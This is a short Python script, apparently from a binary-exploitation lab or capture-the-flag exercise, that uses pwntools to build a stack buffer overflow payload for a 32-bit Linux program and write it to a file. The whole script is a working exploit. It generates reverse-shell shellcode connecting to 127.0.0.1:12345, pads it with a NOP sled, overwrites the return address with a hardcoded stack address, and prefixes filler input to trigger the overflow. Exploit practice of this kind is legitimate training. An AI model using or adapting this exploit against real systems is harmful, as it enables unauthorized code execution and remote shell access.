#!/usr/bin/env python3

from pwn import *
 
context.arch='i386'
context.os='linux'


#Shellcode for reverse shell
s_code = shellcraft.i386.linux.connect('127.0.0.1', 12345) + shellcraft.i386.linux.dupsh('ebp')

# Shellcode for printing "Hello world!!"
#s_code = shellcraft.i386.linux.echo('Hello world!!') + shellcraft.i386.linux.exit()

log.info("Shellcode ready")
print(s_code)

s_code_asm = asm(s_code)
log.info("Shellcode length: %d bytes" % len(s_code_asm))

# Return address in little endian format
offset=279
ret_addr = 0xffffcb60 - offset 
addr = p32(ret_addr, endian='little')
log.info("Return address: %#.8x" % (ret_addr))


# Opcode for the NOP instruction
nop = asm('nop', arch="i386")


# Writes payload on a file
payloadInit=b"2\n" + b"A"*1022
payload =payloadInit + nop*(offset - len(s_code_asm) - 64) + s_code_asm + nop*64 + addr
log.info("Payload ready")


shellcode_file = "./shellcode_payload_32"

with open(shellcode_file, "wb") as f:
        f.write(payload)

log.info("Payload saved into %s" % shellcode_file)

